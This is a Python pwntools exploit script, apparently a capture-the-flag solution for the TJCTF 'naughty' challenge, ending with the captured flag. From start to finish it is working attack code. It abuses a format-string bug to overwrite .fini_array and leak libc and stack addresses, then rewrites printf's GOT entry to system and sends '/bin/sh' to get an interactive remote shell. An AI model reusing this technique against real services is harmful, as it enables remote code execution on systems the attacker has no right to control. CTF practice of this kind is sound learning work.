from pwn import *

#r = process('./naughty')
r = remote('p1.tjctf.org', 8004)

offset = 7

# need to overwrite this stack got with main
main_plt = 0x08048536
fini_array = 0x08049bac
printf_got = 0x8049cb0

# https://stackoverflow.com/questions/22147996/cant-find-a-section-dtors
# overwrite .fini_array 0x08049bac
# leak printf got
# https://github.com/sajjadium/PersianCatsCTF/blob/master/UTCTF/2019/babyecho/exploit.py

payload = ""
payload += p32(fini_array)
payload += p32(printf_got)
payload += "%.{}x".format(0x8536-8)
payload += "%7$hn"
payload += "AAAA%8$s %69$pBBBB"

r.recvuntil('name?')
r.sendline(payload)

libc_leak, stack_leak = r.recvuntil('BBBB').split("AAAA")[-1].split(' ')
libc_leak = u32(libc_leak[:4])
stack_leak = int(stack_leak.replace('BBBB',''),16)

libc_base = libc_leak - 0x050b60
ret_addr = stack_leak - 0x170 - 0x8
system_addr = libc_base + 0x03cd10

log.info('libc leak: {}'.format(hex(libc_leak)))
log.info('libc base: {}'.format(hex(libc_base)))
log.info('stack leak: {}'.format(hex(stack_leak)))
log.info('ret addr: {}'.format(hex(ret_addr)))

#oneshot = 0xdeadbeef # will replace with libc + oneshot gadget
#oneshot = libc_base + 0x13573f
#oneshot = libc_base + 0x13573e
#oneshot = libc_base + 0x672a0
#oneshot = libc_base + 0x6729f
#oneshot = libc_base + 0x3cbf0
#oneshot = libc_base + 0x3cbec
#oneshot = libc_base + 0x3cbea
# Not working lol -----------------------------------------------------

payload = fmtstr_payload(offset, {ret_addr: main_plt, printf_got: system_addr}, write_size='byte')

r.recvuntil('name?')
r.sendline(payload)

r.recvuntil('name?')
r.sendline('/bin/sh')

log.success('Got a shell!')

r.interactive()

# flag: tjctf{form4t_strin9s_ar3_on_th3_n1ce_li5t}
